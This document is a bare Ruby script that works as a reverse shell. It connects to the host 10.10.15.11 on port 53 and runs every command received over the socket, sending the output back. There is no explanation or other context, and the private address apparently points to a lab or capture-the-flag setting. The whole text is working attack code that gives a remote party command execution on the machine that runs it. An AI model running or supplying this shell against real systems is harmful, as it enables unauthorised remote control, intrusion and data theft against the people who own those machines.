require 'socket'
s = TCPSocket.open('10.10.15.11', 53)
while (cmd = s.gets)
  IO.popen(cmd, 'r') do |io|
    s.print io.read
  end
end
